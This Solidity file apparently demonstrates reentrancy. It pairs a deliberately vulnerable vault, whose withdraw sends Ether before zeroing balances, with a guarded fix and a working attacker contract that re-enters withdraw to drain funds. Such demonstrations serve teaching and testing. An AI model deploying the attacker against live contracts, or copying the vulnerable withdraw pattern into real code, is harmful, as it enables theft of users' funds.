// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// @notice Vulnerable vault that violates Checks-Effects-Interactions (CEI).
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");

        // VULNERABILITY: External call before state update (Effects after Interactions)
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @notice Secure vault implementing Checks-Effects-Interactions (CEI) & Mutex Reentrancy Guard.
contract SecureVault {
    error ReentrancyGuardLocked();
    error NoBalance();
    error TransferFailed();

    mapping(address => uint256) public balances;
    uint256 private _status; // 1 = NOT_ENTERED, 2 = ENTERED

    modifier nonReentrant() {
        if (_status == 2) revert ReentrancyGuardLocked();
        _status = 2;
        _;
        _status = 1;
    }

    constructor() {
        _status = 1;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external nonReentrant {
        uint256 amount = balances[msg.sender];
        if (amount == 0) revert NoBalance();

        // MITIGATION 1: State update BEFORE external call (CEI Pattern)
        balances[msg.sender] = 0;

        // MITIGATION 2: External call with return check and nonReentrant mutex
        (bool success, ) = msg.sender.call{value: amount}("");
        if (!success) revert TransferFailed();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/// @notice Exploit contract for testing reentrancy attack vectors.
contract ReentrancyAttacker {
    address public target;
    uint256 public attackAmount;

    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        attackAmount = msg.value;
        // Step 1: Deposit funds into target
        VulnerableVault(target).deposit{value: attackAmount}();
        // Step 2: Trigger withdrawal
        VulnerableVault(target).withdraw();
    }

    // Fallback/receive function intercepts execution and re-enters withdraw
    receive() external payable {
        if (target.balance >= attackAmount) {
            VulnerableVault(target).withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
